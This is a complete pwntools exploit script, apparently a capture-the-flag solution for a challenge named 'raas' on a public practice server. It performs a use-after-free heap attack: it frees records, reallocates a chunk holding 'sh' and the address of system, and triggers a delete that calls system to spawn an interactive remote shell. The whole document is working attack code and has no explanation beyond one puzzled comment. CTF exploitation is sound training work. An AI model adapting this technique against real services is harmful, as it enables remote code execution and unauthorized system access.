from pwn import *

#m=process("./raas")
m=remote("hackme.inndy.tw",7719)

sys_addr=0x80484F0

def add(idx,tp,value):
    m.sendlineafter("Act > ","1")
    m.sendlineafter("Index > ",str(idx))
    m.sendlineafter("Type > ",str(tp))
    m.sendlineafter("Value > ",str(value))

def add1(idx,tp,content,size):
    m.sendlineafter("Act > ","1")
    m.sendlineafter("Index > ",str(idx))
    m.sendlineafter("Type > ",str(tp))
    m.sendlineafter("Length > ",str(size))
    m.sendlineafter("Value > ",content)

def show(idx):
    m.sendlineafter("Act > ","3")
    m.sendlineafter("Index > ",str(idx))

def delete(idx):
    m.sendlineafter("Act > ","2")
    m.sendlineafter("Index > ",str(idx))

add(0,1,20)
add(1,1,20)
add(2,1,20)
delete(1)
delete(2)
payload="sh\x00\x00"+p32(sys_addr)#why it' must be sh\x00\x00
add1(3,2,payload,0xc)
delete(1)
m.interactive()